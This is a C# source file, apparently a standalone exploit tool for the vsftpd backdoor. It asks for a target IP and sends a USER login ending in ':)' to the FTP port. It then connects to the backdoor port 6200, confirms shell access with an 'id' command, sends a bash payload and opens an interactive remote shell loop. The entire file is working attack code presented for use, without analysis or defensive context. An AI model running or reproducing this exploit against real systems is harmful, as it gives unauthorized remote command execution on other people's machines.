using System;
using System.Net.Sockets;
using System.Text;

namespace VsftpdExploit
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("Enter target IP: ");
            string targetIP = Console.ReadLine();

            int ftpPort = 21;
            int backdoorPort = 6200;

            try
            {
                
                if (ConnectToPort(targetIP, backdoorPort, out NetworkStream ns))
                {
                    HandleBackdoor(ns);
                    return;
                }

                
                using (TcpClient ftpClient = new TcpClient(targetIP, ftpPort))
                using (NetworkStream ftpStream = ftpClient.GetStream())
                {
                    byte[] buffer = new byte[1024];
                    int bytesRead = ftpStream.Read(buffer, 0, buffer.Length);
                    string banner = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                    Console.WriteLine("Banner: " + banner.Trim());

                    
                    string userCmd = "USER " + RandomString(6) + ":)\r\n";
                    byte[] userBytes = Encoding.ASCII.GetBytes(userCmd);
                    ftpStream.Write(userBytes, 0, userBytes.Length);

                    bytesRead = ftpStream.Read(buffer, 0, buffer.Length);
                    string userResp = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                    Console.WriteLine("USER: " + userResp.Trim());

                    if (userResp.StartsWith("530 "))
                    {
                        Console.WriteLine("have not backdoor.");
                        return;
                    }

                    if (!userResp.StartsWith("331 "))
                    {
                        Console.WriteLine("server not respond: " + userResp.Trim());
                        return;
                    }

                    
                    string passCmd = "PASS " + RandomString(6) + "\r\n";
                    byte[] passBytes = Encoding.ASCII.GetBytes(passCmd);
                    ftpStream.Write(passBytes, 0, passBytes.Length);

                    
                    if (ConnectToPort(targetIP, backdoorPort, out ns))
                    {
                        HandleBackdoor(ns);
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static bool ConnectToPort(string ip, int port, out NetworkStream stream)
        {
            try
            {
                TcpClient client = new TcpClient(ip, port);
                stream = client.GetStream();
                return true;
            }
            catch
            {
                stream = null;
                return false;
            }
        }

        static void HandleBackdoor(NetworkStream stream)
        {
            try
            {
                byte[] idCmd = Encoding.ASCII.GetBytes("id\n");
                stream.Write(idCmd, 0, idCmd.Length);

                byte[] buffer = new byte[1024];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                if (response.Contains("uid="))
                {
                    Console.WriteLine("UID: " + response.Trim());
                }
                else
                {
                    Console.WriteLine("The service on port 6200 does not appear to be a shell.");
                    return;
                }

                
                string payload = "nohup /bin/bash -i >/dev/null 2>&1 &";
                byte[] payloadBytes = Encoding.ASCII.GetBytes(payload);
                stream.Write(payloadBytes, 0, payloadBytes.Length);

                Console.WriteLine("Payload sent. Handling connection...");

                
                InteractWithShell(stream);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static void InteractWithShell(NetworkStream stream)
        {
            byte[] buffer = new byte[1024];

            while (true)
            {
                Console.Write("shell> ");
                string command = Console.ReadLine() + "\n";
                byte[] cmdBytes = Encoding.ASCII.GetBytes(command);
                stream.Write(cmdBytes, 0, cmdBytes.Length);

                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                Console.WriteLine(response.Trim());
            }
        }

        static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            var result = new char[length];
            for (int i = 0; i < length; i++)
            {
                result[i] = chars[random.Next(chars.Length)];
            }
            return new string(result);
        }
    }
}
